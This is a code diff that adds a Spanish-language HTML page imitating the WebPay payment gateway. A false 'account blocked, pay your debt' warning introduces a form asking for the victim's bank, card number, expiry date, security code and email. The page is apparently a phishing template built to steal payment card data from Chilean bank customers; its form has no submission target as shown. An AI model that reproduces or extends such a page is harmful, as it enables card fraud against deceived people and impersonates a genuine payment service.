@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/color.css">
+    <title>Pago Seguro WebPay</title>
+    <link rel="shortcut icon" type="image/x-icon" href="imagenes/16x16.ico" sizes="16x16">
+</head>
+<body>
+    <div class="col-sm-4"></div>
+    <div class="col-sm-4 text-center"> <!-- Agregado text-center para centrar -->
+        <img src="imagenes/webpay.png" alt="">
+    </div>
+    <div class="col-sm-4"></div>
+    <div class="container mt-5">
+        <h2 class="text-center mb-4">Cuenta bloqueada ¡Cancela tu deuda para continuar!</h2>
+        
+        <form>
+            <div class="mb-3">
+                <label for="datoNumerico1" class="form-label">Nombre y Apellido:</label>
+                <input type="number" class="form-control" id="datoNumerico1" name="datoNumerico1" max="999">
+            </div>
+            <div class="mb-3">
+                <label for="datoNumerico2" class="form-label">Selecciona tu banco</label>
+                <select class="form-select" id="datoNumerico2" name="datoNumerico2">
+                    <option selected>Seleccione una opción</option>
+                    <option value="opcion1">Banco Estado</option>
+                    <option value="opcion2">Banco Falabella</option>
+                    <option value="opcion3">Scotiabank</option>
+                    <option value="opcion4">Banco de Chile</option>
+                    <option value="opcion5">Banco BCI</option>
+                    <option value="opcion6">Mercado Pago</option>
+                    <option value="opcion7">Banco Santander Chile</option>
+                    <option value="opcion8">Itaú Corpbanca</option>
+                    <option value="opcion9">Banco Security</option>                    
+                </select>
+            </div>
+            <div class="mb-3">
+                <label for="Numero de Tarjeta" class="form-label">Numero de tarjeta</label>
+                <input type="text" class="form-control" id="Numero de Tarjeta" name="Numero de Tarjeta">
+                <span class="input-group-text">
+                    <img src="imagenes/visa y mastercard.png" alt="Visa" style="height: 2.5rem;">
+                </span>
+                <div class="mb-3">
+                    <label for="mesVencimiento" class="form-label">Fecha de Vencimiento:</label>
+                    <div class="d-flex">
+                        <select class="form-select me-2" id="mesVencimiento" name="mesVencimiento">
+                            <option selected>Mes</option>
+                            <option value="01">Enero</option>
+                            <option value="02">Febrero</option>
+                            <option value="03">Marzo</option>
+                            <option value="04">Abril</option>
+                            <option value="05">Mayo</option>
+                            <option value="06">Junio</option>
+                            <option value="07">Julio</option>
+                            <option value="08">Agosto</option>
+                            <option value="09">Septiembre</option>
+                            <option value="10">Octubre</option>
+                            <option value="11">Noviembre</option>
+                            <option value="12">Diciembre</option>
+                        </select>
+                        <select class="form-select" id="anioVencimiento" name="anioVencimiento">
+                            <option selected>Año</option>
+                            <option value="2024">2024</option>
+                            <option value="2025">2025</option>
+                            <option value="2026">2026</option>
+                            <option value="2027">2027</option>
+                            <option value="2028">2028</option>
+                            <option value="2029">2029</option>
+                            <option value="2030">2030</option>
+                        </select>
+                    </div>
+                </div>
+            <div class="mb-3">
+                <label for="CVE" class="form-label">CVE</label>
+                <input type="text" class="form-control" id="CVE" name="CVE">
+            </div>
+            <div class="mb-3">
+                <label for="correoElectronico" class="form-label">Correo Electrónico:</label>
+                <input type="email" class="form-control" id="correoElectronico" name="correoElectronico">
+            </div>
+        </form>
+    </div>
+<script src="js/bootstrap.min.js"></script>
+</body>
+</html>
